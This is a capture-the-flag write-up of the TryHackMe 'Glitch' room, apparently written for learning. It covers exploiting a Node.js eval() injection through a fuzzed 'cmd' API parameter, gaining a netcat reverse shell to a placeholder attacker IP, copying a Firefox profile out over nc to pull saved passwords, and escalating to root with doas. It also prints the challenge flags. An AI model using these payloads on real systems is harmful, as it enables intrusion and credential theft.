# GLITCH CTF Writeup 

## Difficulty: Easy
## Platform: TryHackMe (THM)

---

## Executive Summary

This report details the penetration testing process conducted on the GLITCH CTF challenge hosted on TryHackMe. The objective was to achieve initial access, escalate privileges to user level, and ultimately gain root access to capture both user and root flags. The challenge involved web application vulnerabilities, including API endpoint discovery, command injection, and credential reuse. Key findings include a vulnerable Node.js API allowing remote code execution and a misconfigured privilege escalation tool (doas). The engagement resulted in full system compromise, with flags captured: user flag (THM{i_don't_know_why}) and root flag (THM{diamonds_break_our_aching_minds}).

---

## Methodology

The penetration testing followed a structured approach aligned with offensive security best practices:

1. **Reconnaissance**: Initial scanning to identify open ports and services.
2. **Enumeration**: Detailed inspection of web applications, API endpoints, and potential vulnerabilities.
3. **Exploitation**: Leveraging discovered vulnerabilities for initial access and shell establishment.
4. **Privilege Escalation**: Moving from low-privilege access to user and root levels.
5. **Post-Exploitation**: Flag capture and system exploration.

Tools used included Nmap for scanning, wfuzz for fuzzing, curl for API interaction, Netcat for reverse shells, and Firefox for credential extraction. All steps were performed ethically within the CTF environment.

---

## Enumeration

### Port Scanning with Nmap

The initial reconnaissance phase began with a comprehensive Nmap scan to identify open ports and services on the target machine.

**Command:**
```bash
nmap -sC -sV <TARGET_IP> -oN nmap_report
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 12:47 WIB
Nmap scan report for <TARGET_IP>
Host is up (0.32s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: not allowed
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.33 seconds
```

**Analysis:** The scan revealed an open HTTP port (80) running Nginx on Ubuntu, with a title "not allowed" indicating potential access restrictions. This suggested a web application as the primary attack surface.

### Web Application Inspection

Navigating to the web application at `http://<TARGET_IP>`, the page displayed "not allowed". Inspecting the page source revealed a JavaScript function for API access.

**Key Finding:**
```html
<script>
  function getAccess() {
    fetch('/api/access')
      .then((response) => response.json())
      .then((response) => {
        console.log(response);
      });
  }
</script>
```

**Step:** Open the browser console and execute `getAccess()` to trigger the API call.

**Console Output:**
```
getAccess()
undefined
Object { token: "dGhpc19pc19ub3RfcmVhbA==" }
token: "dGhpc19pc19ub3RfcmVhbA=="
<prototype>: Object { … }
```

**Analysis:** The API returned a BASE64-encoded token. Decoding it using CyberChef revealed "this_is_not_real", which appeared to be a placeholder or hint.

### API Fuzzing

To discover additional API endpoints, wfuzz was used to fuzz the `/api/items` endpoint with common API parameters.

**Command:**
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/api/objects.txt -X POST --hc 404,400 <TARGET_IP>/api/items\?FUZZ\=test
```

**Output (Filtered):**
```
000000358:   500        10 L     64 W       1081 Ch     "cmd"
```

**Analysis:** The fuzzing identified "cmd" as a valid parameter that triggered a 500 error, indicating potential command injection vulnerability.

### Testing Command Injection

Testing the "cmd" parameter with a simple command confirmed the vulnerability.

**Command:**
```bash
curl -X POST <TARGET_IP>/api/items\?cmd\=ls
```

**Output:**
```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: ls is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), <anonymous>:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>
```

**Analysis:** The error indicated that the application was using `eval()` to execute the "cmd" parameter in a Node.js environment, allowing JavaScript code execution. This confirmed a command injection vulnerability via the API.

---

## Exploitation

### Establishing Reverse Shell

With command injection confirmed, a reverse shell payload was crafted and executed to gain initial access.

**Payload:**
```javascript
require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f')
```

**URL-Encoded Command:**
```bash
curl -X POST <TARGET_IP>/api/items\?cmd\=%72%65%71%75%69%72%65%28%22%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%22%29%2e%65%78%65%63%28%27%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%3c%41%54%54%41%43%4b%45%52%5f%49%50%3e%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66%20%27%29
```

**Listener Setup:**
```bash
nc -nvlp 4444
```

**Output:**
```
listening on [any] 4444 ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 49492
/bin/sh: 0: can't access tty; job control turned off
$
```

**Step:** Upgrade to a full TTY shell for better interaction.

**Command:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Analysis:** Successful reverse shell established as the "user" account, providing initial foothold on the system.

---

## Privilege Escalation

### User Flag Capture

With shell access, the user flag was located and captured.

**Commands:**
```bash
ls /home
# Output: user v0id

cd /home/user
ls
# Output: user.txt

cat user.txt
# Output: THM{************}
```

### Firefox Profile Extraction

Noting a Firefox directory in the user's home, the profile was archived and transferred for credential extraction.

**Commands on Target:**
```bash
tar -cvf firefox.tar .firefox
nc <ATTACKER_IP> 4444 < firefox.tar
```

**Commands on Attacker:**
```bash
nc -lvnp 4444 > firefox.tar
# Receive the file

cd .firefox
ls -la
# Verify profile structure

firefox --profile .firefox/b5w4643p.default-release
# Launch Firefox with the profile
```

**Analysis:** Opening Firefox revealed saved credentials for user "v0id" with password "love_the_void".

### Root Access via Doas

Using the extracted credentials, privilege escalation was achieved via the "doas" tool (similar to sudo).

**Commands:**
```bash
su v0id
# Enter password: love_the_void

cd /opt
ls
# Output: doas

cd doas
doas -u root /bin/bash
# Enter password: love_the_void

id
# Output: uid=0(root) gid=0(root) groups=0(root)

cd /root
ls
# Output: clean.sh root.txt

cat root.txt
# Output: THM{*************}
```

**Analysis:** The "doas" binary allowed password-based root escalation, leading to full system compromise.

---

## Conclusion

The GLITCH CTF challenge was successfully completed, demonstrating vulnerabilities in web API security and privilege management. Key takeaways include the dangers of unsanitized input in eval() functions and misconfigured privilege escalation tools. Tools like wfuzz and Netcat proved essential for enumeration and exploitation. For reproducibility, ensure a stable network connection and replace placeholders (<TARGET_IP>, <ATTACKER_IP>) with actual IPs. No critical issues were left unaddressed, and the system was fully compromised as per the challenge objectives.
